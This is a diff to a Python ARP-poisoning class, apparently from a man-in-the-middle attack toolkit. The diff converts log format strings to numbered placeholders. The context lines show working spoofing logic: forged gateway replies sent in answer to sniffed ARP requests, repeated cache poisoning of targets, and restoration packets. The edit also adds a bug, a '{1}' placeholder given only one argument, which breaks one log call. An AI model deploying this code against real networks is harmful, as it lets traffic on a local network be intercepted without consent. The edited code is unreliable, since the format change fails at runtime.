@@ -56,15 +56,15 @@ class ARPpoisoner:
         self.mymac      = options.mac
         self.arp_cache  = {}
 
-        log.debug("gatewayip  => {}".format(self.gatewayip))
-        log.debug("gatewaymac => {}".format(self.gatewaymac))
-        log.debug("targets    => {}".format(self.targets))
-        log.debug("ignore     => {}".format(self.ignore))
-        log.debug("ip         => {}".format(self.myip))
-        log.debug("mac        => {}".format(self.mymac))
-        log.debug("interface  => {}".format(self.interface))
-        log.debug("arpmode    => {}".format(self.arpmode))
-        log.debug("interval   => {}".format(self.interval))
+        log.debug("gatewayip  => {0}".format(self.gatewayip))
+        log.debug("gatewaymac => {0}".format(self.gatewaymac))
+        log.debug("targets    => {0}".format(self.targets))
+        log.debug("ignore     => {0}".format(self.ignore))
+        log.debug("ip         => {0}".format(self.myip))
+        log.debug("mac        => {0}".format(self.mymac))
+        log.debug("interface  => {0}".format(self.interface))
+        log.debug("arpmode    => {0}".format(self.arpmode))
+        log.debug("interval   => {0}".format(self.interval))
 
     def start(self):
 
@@ -125,7 +125,7 @@ class ARPpoisoner:
             sniff(prn=self.arp_watch_callback, filter="arp", store=0)
         except Exception as e:
             if "Interrupted system call" not in e:
-                log.error("[ARPWatch] Exception occurred when invoking sniff(): {}".format(e))
+                log.error("[ARPWatch] Exception occurred when invoking sniff(): {0}".format(e))
             pass
 
     def arp_watch_callback(self, pkt):
@@ -139,7 +139,7 @@ class ARPpoisoner:
                 #print str(pkt[ARP].pdst) #ip of destination (Who is ...?)
 
                 if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and self.myip != str(pkt[ARP].psrc)):
-                    log.debug("[ARPWatch] {} is asking where the Gateway is. Sending the \"I'm the gateway biatch!\" reply!".format(pkt[ARP].psrc))
+                    log.debug("[ARPWatch] {0} is asking where the Gateway is. Sending the \"I'm the gateway biatch!\" reply!".format(pkt[ARP].psrc))
                     #send repoison packet
                     packet = ARP()
                     packet.op = 2
@@ -148,7 +148,7 @@ class ARPpoisoner:
                     packet.pdst = str(pkt[ARP].psrc)
 
                 elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
-                    log.debug("[ARPWatch] Gateway asking where {} is. Sending the \"I'm {} biatch!\" reply!".format(pkt[ARP].pdst, pkt[ARP].pdst))
+                    log.debug("[ARPWatch] Gateway asking where {0} is. Sending the \"I'm {1} biatch!\" reply!".format(pkt[ARP].pdst, pkt[ARP].pdst))
                     #send repoison packet
                     packet = ARP()
                     packet.op = 2
@@ -157,7 +157,7 @@ class ARPpoisoner:
                     packet.pdst = str(pkt[ARP].pdst)
 
                 elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
-                    log.debug("[ARPWatch] Gateway asking where {} is. Sending the \"This is the h4xx0r box!\" reply!".format(pkt[ARP].pdst))
+                    log.debug("[ARPWatch] Gateway asking where {0} is. Sending the \"This is the h4xx0r box!\" reply!".format(pkt[ARP].pdst))
 
                     packet = ARP()
                     packet.op = 2
@@ -170,7 +170,7 @@ class ARPpoisoner:
                         self.s.send(packet)
                 except Exception as e:
                     if "Interrupted system call" not in e:
-                        log.error("[ARPWatch] Exception occurred while sending re-poison packet: {}".format(e))
+                        log.error("[ARPWatch] Exception occurred while sending re-poison packet: {0}".format(e))
 
     def resolve_target_mac(self, targetip):
         targetmac = None
@@ -186,14 +186,14 @@ class ARPpoisoner:
             except Exception as e:
                 resp= ''
                 if "Interrupted system call" not in e:
-                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
+                   log.error("Exception occurred while poisoning {0}: {1}".format(targetip, e))
 
             if len(resp) > 0:
                 targetmac = resp[0][1].hwsrc
                 self.arp_cache[targetip] = targetmac # shove that address in our cache
-                log.debug("Resolved {} => {}".format(targetip, targetmac))
+                log.debug("Resolved {0} => {1}".format(targetip, targetmac))
             else:
-                log.debug("Unable to resolve MAC address of {}".format(targetip))
+                log.debug("Unable to resolve MAC address of {1}".format(targetip))
 
         return targetmac
 
@@ -218,7 +218,7 @@ class ARPpoisoner:
                                 self.s2.send(Ether(src=targetmac, dst=self.gatewaymac)/ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                             except Exception as e:
                                 if "Interrupted system call" not in e:
-                                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
+                                   log.error("Exception occurred while poisoning {0}: {1}".format(targetip, e))
 
             sleep(self.interval)
 
@@ -228,7 +228,7 @@ class ARPpoisoner:
         count = 2
 
         if self.targets is None:
-            log.info("Restoring subnet connection with {} packets".format(count))
+            log.info("Restoring subnet connection with {0} packets".format(count))
             pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op="is-at")
             for i in range(0, count):
                 self.s2.send(pkt)
@@ -239,14 +239,14 @@ class ARPpoisoner:
                 targetmac = self.resolve_target_mac(targetip)
 
                 if targetmac is not None:
-                    log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
+                    log.info("Restoring connection {0} <-> {1} with {2} packets per host".format(targetip, self.gatewayip, count))
                     try:
                         for i in range(0, count):
                             self.s2.send(Ether(src=targetmac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac))
                             self.s2.send(Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac))
                     except Exception as e:
                         if "Interrupted system call" not in e:
-                           log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
+                           log.error("Exception occurred while poisoning {0}: {1}".format(targetip, e))
 
         #close the sockets
         self.s.close()
